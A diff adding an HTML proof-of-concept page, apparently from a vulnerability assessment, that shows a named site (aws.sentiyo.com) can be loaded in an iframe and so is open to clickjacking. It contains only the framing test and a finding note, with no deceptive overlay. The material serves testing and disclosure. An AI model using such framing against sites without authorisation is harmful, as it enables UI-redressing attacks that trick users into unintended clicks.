@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>VAPT Proof of Concept - Clickjacking</title>
+    <style>
+        body { font-family: "Segoe UI", Tahoma, sans-serif; margin: 40px; line-height: 1.6; }
+        .container { border: 2px dashed #ff0000; padding: 20px; background-color: #fff5f5; }
+        .target-frame { border: 5px solid #333; margin-top: 20px; width: 80%; height: 500px; }
+        h1 { color: #d9534f; }
+        code { background: #eee; padding: 2px 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Vulnerability Confirmed: Clickjacking</h1>
+        <p><strong>Finding:</strong> Insecure <code>frame-ancestors</code> directive.</p>
+        <p><strong>Evidence:</strong> This page is a local file. If the target application loads below, it proves that <strong>any</strong> external origin can frame the application, leading to UI Redressing attacks.</p>
+        
+        <iframe src="https://aws.sentiyo.com" class="target-frame"></iframe>
+    </div>
+</body>
+</html>
